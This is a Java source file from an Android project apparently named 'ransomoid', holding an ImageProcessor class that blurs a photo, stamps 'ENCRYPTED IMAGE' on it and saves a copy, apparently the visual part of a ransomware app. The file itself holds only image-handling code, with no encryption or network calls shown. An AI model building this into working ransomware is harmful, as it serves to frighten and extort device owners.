package falezza.fabio.ransomoid.utils;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.res.Resources;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.Rect;
import android.renderscript.Allocation;
import android.renderscript.Element;
import android.renderscript.RenderScript;
import android.renderscript.ScriptIntrinsicBlur;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;

/**
 * Created by fabio on 31/01/18.
 */

public class ImageProcessor {
    private static final int blurFactor = 1000;
    private static final float BLUR_RADIUS = 25f;
    private static final String message = "ENCRYPTED IMAGE";
    @SuppressLint("StaticFieldLeak")
    private static ImageProcessor instance;
    private Bitmap image;
    private File file;
    private Context context;
    private final RenderScript renderScript;

    private ImageProcessor(Context context) {
        this.context = context;
        this.renderScript = RenderScript.create(this.context);
    }

    public static ImageProcessor getInstance(Context context) {
        if (instance == null) {
            instance = new ImageProcessor(context);
        }
        return instance;
    }

    public Bitmap getImage() {
        return image;
    }

    public void setImage(Bitmap image) {
        this.image = image;
    }

    public Bitmap scaleImage() {
        int width = this.image.getWidth() / blurFactor;
        int height = this.image.getHeight() / blurFactor;
        Bitmap b = Bitmap.createScaledBitmap(this.image, width, height, true);
        return Bitmap.createScaledBitmap(b, width * 10, height * 10, true);
    }

    public void blur() {
        if (null == this.image) return;

        Bitmap outputBitmap = Bitmap.createBitmap(this.image);
        Allocation tmpIn = Allocation.createFromBitmap(renderScript, this.image);
        Allocation tmpOut = Allocation.createFromBitmap(renderScript, outputBitmap);
        //Intrinsic Gaussian blur filter
        ScriptIntrinsicBlur theIntrinsic = ScriptIntrinsicBlur.create(renderScript, Element.U8_4(renderScript));
        theIntrinsic.setRadius(BLUR_RADIUS);
        theIntrinsic.setInput(tmpIn);
        theIntrinsic.forEach(tmpOut);
        tmpOut.copyTo(outputBitmap);
        this.image = outputBitmap;
    }

    public void drawText() {
        if (null == this.image) return;

        Resources resources = this.context.getResources();
        float scale = resources.getDisplayMetrics().density;

        Bitmap mutableBitmap = this.image.copy(Bitmap.Config.ARGB_8888, true);

        Canvas canvas = new Canvas(mutableBitmap);
        // new antialias Paint
        Paint paint = new Paint(Paint.ANTI_ALIAS_FLAG);
        // text color - #3D3D3D
        paint.setColor(Color.rgb(61, 61, 61));
        // text size in pixels
        paint.setTextSize((int) (20 * scale));
        // text shadow
        paint.setShadowLayer(1f, 0f, 1f, Color.WHITE);

        // draw text to the Canvas center
        Rect bounds = new Rect();
        paint.getTextBounds(message, 0, message.length(), bounds);
        int x = (this.image.getWidth() - bounds.width()) / 2;
        int y = (this.image.getHeight() + bounds.height()) / 2;

        canvas.drawText(message, x, y, paint);

        this.image = mutableBitmap.copy(Bitmap.Config.ARGB_8888, false);
    }

    public void saveCopy() throws IOException {
        FileProcessor fileProcessor = FileProcessor.getInstance();
        ByteArrayOutputStream stream = new ByteArrayOutputStream();
        this.image.compress(Bitmap.CompressFormat.JPEG, 50, stream);
        FileOutputStream fos = new FileOutputStream(fileProcessor.getCopyName(this.file));
        fos.write(stream.toByteArray());
        fos.close();
        stream.close();
    }

    public File getFile() {
        return file;
    }

    public void setFile(File file) {
        this.file = file;
        BitmapFactory.Options options = new BitmapFactory.Options();
        options.inPreferredConfig = Bitmap.Config.ARGB_8888;
        this.image = BitmapFactory.decodeFile(this.file.getPath(), options);
    }
}
